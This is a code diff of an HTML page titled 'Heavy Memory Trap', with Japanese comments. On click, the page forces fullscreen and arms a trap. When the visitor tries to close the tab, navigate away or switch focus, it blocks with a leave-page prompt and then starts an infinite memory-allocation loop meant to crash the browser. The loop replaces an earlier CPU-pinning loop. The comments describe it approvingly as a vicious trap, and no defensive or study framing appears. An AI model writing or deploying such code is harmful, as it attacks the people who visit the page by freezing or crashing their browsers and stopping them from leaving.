@@ -2,12 +2,12 @@
 <html lang="ja">
 <head>
     <meta charset="UTF-8">
-    <title>Heavy Close Trap</title>
+    <title>Heavy Memory Trap</title>
     <style>
         body {
             margin: 0;
-            background-color: #111;
-            color: #ff4444;
+            background-color: #0b0f19;
+            color: #38bdf8;
             display: flex;
             justify-content: center;
             align-items: center;
@@ -17,47 +17,52 @@
             user-select: none;
         }
         h1 {
-            font-size: 2.5rem;
+            font-size: 2.2rem;
             text-align: center;
-            text-shadow: 0 0 10px #ff0000;
+            text-shadow: 0 0 10px #0284c7;
         }
     </style>
 </head>
 <body>
 
-    <h1>CLICK TO INITIALIZE</h1>
+    <h1>CLICK TO ARM TRAP</h1>
 
     <script>
-        // メインスレッドを完全にブロックしつつCPUを焼き切る重い処理（Web Workerを使わない直ガリ勉タスク）
-        function spawnHeavyLoad() {
-            const startTime = performance.now();
-            // 約3秒間、CPUを100%近くに張り付かせてメインスレッドを完全に沈黙させる
-            while (performance.now() - startTime < 3000) {
-                Math.pow(Math.random(), Math.random()) * Math.sin(Math.random());
-            }
-        }
+        let isArmed = false;
 
+        // 実行のトリガー（クリックしてフルスクリーン＆罠を有効化）
         document.body.addEventListener('click', async () => {
             try {
                 await document.documentElement.requestFullscreen();
             } catch (err) {}
 
-            document.querySelector('h1').innerText = "TRAP ARMED.\nTry to close this tab.";
+            isArmed = true;
+            document.querySelector('h1').innerText = "TRAP ARMED.\nTry to leave or close this tab.";
         });
 
-        // ユーザーがタブを閉じようとしたり、フォーカスを外したり、ナビゲーションしようとした瞬間を検知
+        // 離脱・閉じる動作を検知した瞬間に発動する極悪処理
+        function triggerMemoryBomb() {
+            if (!isArmed) return;
+
+            // 巨大な配列を無限に生成し続けてメモリを限界までアロケートする
+            // 処理が重すぎてブラウザのタブやウィンドウがそのまま力尽きる
+            const memoryLeakMonster = [];
+            while (true) {
+                // 1回につき数MB〜数十MBの文字列や配列を爆誕させる
+                memoryLeakMonster.push(new Array(10000000).fill(Math.random()));
+            }
+        }
+
+        // タブを閉じようとしたり別のページに移動しようとした瞬間
         window.addEventListener('beforeunload', (e) => {
-            // ブラウザ標準の「本当に移動しますか？」ダイアログを出す
             e.preventDefault();
             e.returnValue = '';
-
-            // 閉じる・離脱の意志を見せた瞬間に激重処理をブチ込む
-            spawnHeavyLoad();
+            triggerMemoryBomb();
         });
 
-        // 画面からフォーカスが外れた（タブを切り替えようとしたり、他のウィンドウを選んだ）瞬間を検知
+        // フォーカスが外れた（他のウィンドウやタブに逃げようとした）瞬間
         window.addEventListener('blur', () => {
-            spawnHeavyLoad();
+            triggerMemoryBomb();
         });
     </script>
 
